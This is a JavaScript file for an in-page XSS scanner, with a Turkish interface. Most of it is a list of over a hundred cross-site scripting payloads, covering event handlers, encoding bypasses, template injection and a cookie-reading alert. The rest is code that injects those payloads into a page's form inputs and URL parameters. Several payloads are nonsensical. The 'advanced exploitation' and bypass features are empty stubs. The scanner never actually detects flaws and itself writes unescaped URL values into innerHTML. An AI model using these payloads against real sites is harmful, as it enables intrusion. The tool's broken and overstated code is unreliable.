// scanner.js - Advanced XSS Scanner with Modern Payloads
(function() {
    console.log('NullSecurity XSS Scanner loaded!');
    
    // 2024 Güncel XSS Payloadları
    const xssPayloads = [
        // Basic Script Tags
        '<script>alert(1)</script>',
        '<script>alert(document.domain)</script>',
        '<script>print()</script>',
        
        // IMG Tags with Events
        '<img src=x onerror=alert(1)>',
        '<img src=x onerror=alert(document.cookie)>',
        '<img src=x onload=alert(1)>',
        '<img src=x onmouseover=alert(1)>',
        
        // SVG Vectors
        '<svg onload=alert(1)>',
        '<svg onload=alert(document.domain)>',
        '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
        
        // Body Events
        '<body onload=alert(1)>',
        '<body onpageshow=alert(1)>',
        '<body onfocus=alert(1)>',
        
        // Iframe Vectors
        '<iframe src="javascript:alert(1)">',
        '<iframe onload=alert(1)>',
        '<iframe srcdoc="<script>alert(1)</script>">',
        
        // Input/Button Events
        '<input onfocus=alert(1) autofocus>',
        '<input onblur=alert(1) autofocus><input autofocus>',
        '<button onfocus=alert(1) autofocus>',
        '<select onfocus=alert(1) autofocus>',
        
        // Form Events
        '<form onsubmit=alert(1)><input type=submit>',
        '<form onreset=alert(1)><input type=reset>',
        '<form><button formaction=javascript:alert(1)>click</button>',
        
        // Video/Audio Events
        '<video src=x onerror=alert(1)>',
        '<audio src=x onerror=alert(1)>',
        '<video><source onerror=alert(1)>',
        
        // Details/Menu Events
        '<details open ontoggle=alert(1)>',
        '<details ontoggle=alert(1)>',
        
        // Marquee Events
        '<marquee onstart=alert(1)>',
        '<marquee loop=1 width=0 onfinish=alert(1)>',
        
        // Meta Refresh
        '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
        
        // Object/Embed
        '<object data="javascript:alert(1)">',
        '<embed src="javascript:alert(1)">',
        
        // Base Tag
        '<base href="javascript:alert(1)//">',
        
        // MathML
        '<math href="javascript:alert(1)">CLICK</math>',
        
        // Template
        '<template onload=alert(1)>',
        
        // CSS Expressions (IE)
        '<div style="background:url(javascript:alert(1))">',
        '<div style="width:expression(alert(1))">',
        
        // JavaScript URIs
        'javascript:alert(1)',
        'javascript:alert(document.domain)',
        'javascript:prompt(1)',
        'javascript:confirm(1)',
        
        // Data URIs
        'data:text/html,<script>alert(1)</script>',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        
        // VBScript (IE)
        'vbscript:msgbox(1)',
        
        // Event Handlers in Attributes
        '" onmouseover="alert(1)',
        '" onfocus="alert(1)" autofocus="',
        '" onload="alert(1)"',
        "' onmouseover='alert(1)'",
        
        // Template Literals
        '${alert(1)}',
        '`${alert(1)}`',
        '{{alert(1)}}',
        '#{alert(1)}',
        
        // Unicode and Encoding Bypasses
        '<script>alert&#40;1&#41;</script>',
        '<script>alert&#x28;1&#x29;</script>',
        '<img src=x onerror&#61;alert&#40;1&#41;>',
        
        // Case Variations
        '<ScRiPt>alert(1)</sCrIpT>',
        '<IMG SRC=x ONERROR=alert(1)>',
        
        // No Quotes
        '<img src=x onerror=alert(1)>',
        '<script>alert(1)</script>',
        
        // Double Quotes
        '<img src="x" onerror="alert(1)">',
        '<script>alert("1")</script>',
        
        // Single Quotes
        "<img src='x' onerror='alert(1)'>",
        "<script>alert('1')</script>",
        
        // Backticks
        '<img src=x onerror=`alert(1)`>',
        
        // URL Obfuscation
        'jav&#x09;ascript:alert(1)',
        'jav&#x0A;ascript:alert(1)',
        'jav&#x0D;ascript:alert(1)',
        
        // Special Characters
        '<script>alert`1`</script>',
        '<script>(alert)(1)</script>',
        '<script>alert.call(null,1)</script>',
        '<script>alert.apply(null,[1])</script>',
        
        // DOM-Based Payloads
        '<script>window.location="javascript:alert(1)"</script>',
        '<script>document.location="javascript:alert(1)"</script>',
        '<script>eval("al"+"ert(1)")</script>',
        '<script>Function("ale"+"rt(1)")()</script>',
        
        // Modern ES6
        '<script>setTimeout`alert\\x281\\x29`</script>',
        '<script>setInterval`alert\\x281\\x29`</script>',
        '<script>[...[1]].map(alert)</script>',
        
        // WebSocket/Socket.IO
        '<script>socket.emit("xss", "alert(1)")</script>',
        
        // AngularJS Injection
        '{{$on.constructor("alert(1)")()}}',
        '{{constructor.constructor("alert(1)")()}}',
        
        // React JSX Injection
        '{alert(1)}',
        '{`${alert(1)}`}',
        
        // Vue.js Injection
        '{{_c.constructor("alert(1)")()}}',
        
        // PHP Specific
        '<?php echo "<script>alert(1)</script>" ?>',
        '${${phpinfo()}}',
        
        // Node.js Specific
        '{{with .Output}}alert(1){{end}}',
        '{{=alert(1)}}',
        
        // SQL Injection + XSS
        "1'; alert(1);--",
        "1\"; alert(1);--",
        
        // File Upload Bypass
        'test.jpg<script>alert(1)</script>',
        'test.php.png',
        
        // HTTP Header Injection
        'test\r\nHeader: value\r\nXSS: <script>alert(1)</script>',
        
        // Local Storage XSS
        '<script>localStorage.setItem("xss", "<script>alert(1)</script>")</script>',
        
        // Cookie Manipulation
        '<script>document.cookie="xss=alert(1)"</script>',
        
        // PostMessage XSS
        '<script>window.postMessage("xss","*")</script>',
        
        // Fetch/XHR XSS
        '<script>fetch("javascript:alert(1)")</script>',
        
        // WebRTC XSS
        '<script>RTCPeerConnection("javascript:alert(1)")</script>',
        
        // Service Worker XSS
        '<script>navigator.serviceWorker.register("javascript:alert(1)")</script>',
        
        // Notification XSS
        '<script>new Notification("",{body:"<script>alert(1)</script>"})</script>',
        
        // Clipboard XSS
        '<script>navigator.clipboard.writeText("<script>alert(1)</script>")</script>',
        
        // Geolocation XSS
        '<script>navigator.geolocation.getCurrentPosition("alert(1)")</script>',
        
        // Camera/Mic XSS
        '<script>navigator.mediaDevices.getUserMedia("alert(1)")</script>',
        
        // Payment Request XSS
        '<script>new PaymentRequest("alert(1)")</script>',
        
        // BroadcastChannel XSS
        '<script>new BroadcastChannel("xss").postMessage("alert(1)")</script>',
        
        // SharedWorker XSS
        '<script>new SharedWorker("javascript:alert(1)")</script>',
        
        // IndexedDB XSS
        '<script>indexedDB.open("xss<script>alert(1)</script>")</script>',
        
        // WebSQL XSS (deprecated but still exists)
        '<script>openDatabase("xss", "1.0", "xss", 1).transaction(function(tx){tx.executeSql("alert(1)")})</script>'
    ];

    // UI oluştur
    function createUI() {
        const panel = document.createElement('div');
        panel.id = 'xss-scanner-panel';
        panel.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            width: 600px;
            background: #0d1117;
            color: #f0f6fc;
            padding: 20px;
            border-radius: 12px;
            z-index: 10000;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            box-shadow: 0 8px 32px rgba(0,0,0,0.4);
            max-height: 85vh;
            overflow-y: auto;
            border: 2px solid #238636;
        `;
        
        panel.innerHTML = `
            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;border-bottom:2px solid #238636;padding-bottom:15px;">
                <h3 style="margin:0;color:#58a6ff;font-size:18px;">
                    🛡️ NullSecurity XSS Scanner v2.0
                </h3>
                <button onclick="document.getElementById('xss-scanner-panel').remove()" 
                        style="background:#da3633;color:white;border:none;padding:5px 10px;border-radius:5px;cursor:pointer;font-size:16px;">
                    ✕
                </button>
            </div>
            
            <div style="margin-bottom:20px;background:#161b22;padding:15px;border-radius:8px;">
                <label style="display:block;margin-bottom:8px;color:#58a6ff;font-weight:bold;">Test Modu:</label>
                <select id="testMode" style="width:100%;padding:10px;background:#0d1117;color:#f0f6fc;border:1px solid #30363d;border-radius:6px;font-size:14px;">
                    <option value="passive">🛡️ Pasif Tarama (Güvenli Analiz)</option>
                    <option value="active">⚡ Aktif Test (100+ Payload)</option>
                    <option value="dom">🎯 DOM XSS Testi</option>
                    <option value="advanced">🔥 Advanced Exploitation</option>
                </select>
            </div>
            
            <div style="margin-bottom:15px;">
                <label style="display:block;margin-bottom:8px;color:#58a6ff;font-weight:bold;">Hedef Elementler:</label>
                <div style="display:flex;gap:10px;flex-wrap:wrap;">
                    <label style="display:flex;align-items:center;gap:5px;">
                        <input type="checkbox" id="chkForms" checked> Formlar
                    </label>
                    <label style="display:flex;align-items:center;gap:5px;">
                        <input type="checkbox" id="chkInputs" checked> Inputlar
                    </label>
                    <label style="display:flex;align-items:center;gap:5px;">
                        <input type="checkbox" id="chkURL" checked> URL Parametreleri
                    </label>
                    <label style="display:flex;align-items:center;gap:5px;">
                        <input type="checkbox" id="chkStorage" checked> Local Storage
                    </label>
                </div>
            </div>
            
            <div id="xss-results" style="margin:15px 0;font-size:13px;min-height:200px;max-height:400px;overflow-y:auto;background:#161b22;padding:15px;border-radius:8px;">
                <p style="color:#8b949e;text-align:center;">🎯 Mod seçin ve taramayı başlatın</p>
            </div>
            
            <div style="display:flex;gap:10px;margin-top:20px;">
                <button onclick="startAdvancedScan()" 
                        style="background:#238636;color:white;border:none;padding:12px 20px;border-radius:6px;cursor:pointer;flex:1;font-weight:bold;font-size:14px;">
                    🚀 Taramayı Başlat
                </button>
                <button onclick="clearResults()" 
                        style="background:#da3633;color:white;border:none;padding:12px 20px;border-radius:6px;cursor:pointer;">
                    🗑️ Temizle
                </button>
            </div>
            
            <div style="margin-top:15px;font-size:11px;color:#8b949e;text-align:center;border-top:1px solid #30363d;padding-top:10px;">
                ⚡ ${xssPayloads.length}+ XSS Payload | 🛡️ NullSecurity Team
            </div>
        `;
        
        document.body.appendChild(panel);
    }
    
    // Sonuçları logla
    function logResult(message, type = 'info') {
        const colors = {
            'critical': '#ff7b72',
            'high': '#ffa198',
            'medium': '#ffd500', 
            'low': '#d4a72c',
            'info': '#79c0ff',
            'safe': '#56d364',
            'warning': '#e3b341'
        };
        
        const icons = {
            'critical': '💀',
            'high': '🔥',
            'medium': '⚠️',
            'low': '📝',
            'info': 'ℹ️',
            'safe': '✅',
            'warning': '🎯'
        };
        
        const resultDiv = document.createElement('div');
        resultDiv.style.cssText = `
            background: #161b22;
            padding: 12px;
            margin: 8px 0;
            border-radius: 6px;
            border-left: 4px solid ${colors[type]};
            font-size: 12px;
            border: 1px solid #30363d;
        `;
        resultDiv.innerHTML = `${icons[type]} ${message}`;
        document.getElementById('xss-results').appendChild(resultDiv);
        
        // Otomatik scroll
        resultDiv.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
    }

    // Pasif tarama
    function passiveScan() {
        logResult('<strong>🛡️ Pasif Tarama Başlatıldı</strong> - Güvenli analiz modu', 'info');
        
        const urlParams = new URLSearchParams(window.location.search);
        let suspiciousFound = false;
        
        // URL parametre analizi
        urlParams.forEach((value, key) => {
            xssPayloads.forEach(payload => {
                const shortPattern = payload.substring(0, 15).toLowerCase();
                if (value.toLowerCase().includes(shortPattern) || key.toLowerCase().includes(shortPattern)) {
                    logResult(
                        `🚨 <strong>Şüpheli URL Parametresi</strong><br>
                         <code>${key} = ${value.substring(0, 50)}</code><br>
                         🔍 Benzer payload: <code>${payload.substring(0, 30)}...</code>`,
                        'high'
                    );
                    suspiciousFound = true;
                }
            });
        });
        
        if (!suspiciousFound && urlParams.size > 0) {
            logResult(`✅ ${urlParams.size} URL parametresi temiz`, 'safe');
        }
        
        // Form analizi
        const forms = document.forms;
        logResult(`📝 ${forms.length} form tespit edildi`, 'info');
        
        Array.from(forms).forEach((form, index) => {
            const inputs = form.querySelectorAll('input, textarea, select');
            const sensitiveInputs = Array.from(inputs).filter(input => 
                input.type === 'text' || input.type === 'search' || input.type === 'url' || 
                input.type === 'email' || input.tagName.toLowerCase() === 'textarea'
            );
            
            logResult(
                `Form ${index + 1}: ${inputs.length} input (${sensitiveInputs.length} test edilebilir)<br>
                 🆔 ID: <code>${form.id || 'yok'}</code> | Action: <code>${form.action || 'current'}</code>`,
                sensitiveInputs.length > 0 ? 'warning' : 'low'
            );
        });
        
        // DOM XSS pattern'leri
        scanForDangerousPatterns();
    }

    // Aktif XSS testi
    async function activeScan() {
        logResult('⚡ <strong>Aktif XSS Testi Başlatıldı</strong> - Gerçek payloadlar enjekte ediliyor!', 'critical');
        
        let totalTests = 0;
        let vulnerabilities = 0;
        
        // Form testleri
        if (document.getElementById('chkForms').checked) {
            const forms = document.forms;
            Array.from(forms).forEach((form, formIndex) => {
                const inputs = form.querySelectorAll('input[type="text"], input[type="search"], input[type="url"], input[type="email"], textarea');
                
                if (inputs.length > 0) {
                    logResult(`🎯 Form ${formIndex + 1} test ediliyor (${inputs.length} input)`, 'warning');
                    
                    // 5 random payload testi
                    const testPayloads = getRandomPayloads(5);
                    testPayloads.forEach((payload, payloadIndex) => {
                        totalTests++;
                        logResult(
                            `🧪 Test ${payloadIndex + 1}: <code>${payload.substring(0, 40)}...</code>`,
                            'low'
                        );
                        
                        // Input'lara payload enjekte et
                        inputs.forEach(input => {
                            const original = input.value;
                            input.value = payload;
                            
                            // Konsola test log'u
                            console.log(`[XSS Test] Form: ${formIndex}, Input: ${input.name}, Payload: ${payload}`);
                            
                            // 1 saniye sonra temizle
                            setTimeout(() => {
                                input.value = original;
                            }, 1000);
                        });
                    });
                }
            });
        }
        
        // URL testi
        if (document.getElementById('chkURL').checked && totalTests === 0) {
            logResult('🔗 URL testleri yapılıyor...', 'info');
            const testPayloads = getRandomPayloads(3);
            
            testPayloads.forEach(payload => {
                const testUrl = new URL(window.location.href);
                testUrl.searchParams.set('test_xss', payload);
                
                logResult(
                    `🔗 Test URL: <button onclick="window.open('${testUrl}', '_blank')" 
                     style="background:#238636;color:white;border:none;padding:4px 8px;border-radius:3px;cursor:pointer;font-size:11px;">
                     Aç</button> <code>${testUrl.toString().substring(0, 60)}...</code>`,
                    'medium'
                );
            });
        }
        
        setTimeout(() => {
            logResult(`✅ Aktif test tamamlandı: ${totalTests} test yapıldı`, 'safe');
        }, 2000);
    }

    // DOM XSS testi
    function domScan() {
        logResult('🎯 <strong>DOM XSS Taraması Başlatıldı</strong>', 'info');
        scanForDangerousPatterns();
        testSinkSources();
    }

    // Advanced exploitation
    function advancedScan() {
        logResult('🔥 <strong>Advanced Exploitation Başlatıldı</strong>', 'critical');
        
        // CSP Bypass testleri
        testCSPBypasses();
        
        // WAF Bypass testleri
        testWAFBypasses();
        
        // Modern API testleri
        testModernAPIs();
    }

    // Yardımcı fonksiyonlar
    function getRandomPayloads(count) {
        const shuffled = [...xssPayloads].sort(() => 0.5 - Math.random());
        return shuffled.slice(0, count);
    }

    function scanForDangerousPatterns() {
        const dangerousPatterns = [
            { pattern: /innerHTML\s*=[^=]/, name: 'innerHTML assignment', risk: 'high' },
            { pattern: /outerHTML\s*=[^=]/, name: 'outerHTML assignment', risk: 'high' },
            { pattern: /document\.write\([^)]/, name: 'document.write', risk: 'high' },
            { pattern: /eval\s*\([^)]/, name: 'eval function', risk: 'critical' },
            { pattern: /setTimeout\s*\([^,]*\)/, name: 'setTimeout with string', risk: 'medium' },
            { pattern: /setInterval\s*\([^,]*\)/, name: 'setInterval with string', risk: 'medium' },
            { pattern: /\.src\s*=[^=]javascript:/, name: 'javascript: src', risk: 'high' },
            { pattern: /location\.href\s*=[^=]javascript:/, name: 'javascript: location', risk: 'high' }
        ];
        
        const scripts = document.scripts;
        let foundCount = 0;
        
        Array.from(scripts).forEach((script, index) => {
            const content = script.innerHTML || script.src;
            dangerousPatterns.forEach(pattern => {
                if (pattern.pattern.test(content)) {
                    foundCount++;
                    logResult(
                        `⚠️ <strong>${pattern.name}</strong> bulundu<br>
                         📜 Script: #${index + 1} | Risk: <span style="color:${pattern.risk === 'critical' ? '#ff7b72' : '#ffa198'}">${pattern.risk.toUpperCase()}</span>`,
                        pattern.risk
                    );
                }
            });
        });
        
        if (foundCount === 0) {
            logResult('✅ Tehlikeli DOM patternleri bulunamadı', 'safe');
        }
    }

    function testSinkSources() {
        logResult('🔍 DOM Sink/Source analizi yapılıyor...', 'info');
        // DOM XSS testleri buraya eklenecek
    }

    function testCSPBypasses() {
        logResult('🛡️ CSP Bypass testleri...', 'warning');
        // CSP bypass testleri
    }

    function testWAFBypasses() {
        logResult('🚧 WAF Bypass testleri...', 'warning');
        // WAF bypass testleri
    }

    function testModernAPIs() {
        logResult('🔮 Modern API testleri...', 'info');
        // Modern API testleri
    }

    // Ana tarama fonksiyonu
    window.startAdvancedScan = function() {
        const testMode = document.getElementById('testMode').value;
        const results = document.getElementById('xss-results');
        results.innerHTML = '';
        
        switch(testMode) {
            case 'passive':
                passiveScan();
                break;
            case 'active':
                if (confirm('⚠️ AKTİF XSS TESTİ!\n\nGerçek XSS payloadları enjekte edilecek.\nSadece test izniniz olan sitelerde kullanın!\n\nDevam?')) {
                    activeScan();
                }
                break;
            case 'dom':
                domScan();
                break;
            case 'advanced':
                if (confirm('🔥 ADVANCED EXPLOITATION!\n\nGelişmiş saldırı teknikleri test edilecek.\nSADECE kendi sunucularınızda kullanın!\n\nDevam?')) {
                    advancedScan();
                }
                break;
        }
    };
    
    window.clearResults = function() {
        document.getElementById('xss-results').innerHTML = '<p style="color:#8b949e;text-align:center;">🎯 Mod seçin ve taramayı başlatın</p>';
    };
    
    // UI'yı başlat
    createUI();
    
    // Hızlı analiz
    setTimeout(() => {
        const stats = {
            params: new URLSearchParams(window.location.search).size,
            forms: document.forms.length,
            scripts: document.scripts.length,
            inputs: document.querySelectorAll('input, textarea').length
        };
        
        logResult(
            `📊 <strong>Hızlı Analiz:</strong><br>
             🔗 URL Params: ${stats.params} | 📝 Formlar: ${stats.forms}<br>
             📜 Scriptler: ${stats.scripts} | ⌨️ Inputlar: ${stats.inputs}<br>
             ⚡ Payloadlar: ${xssPayloads.length} hazır`,
            'info'
        );
    }, 500);
    
})();
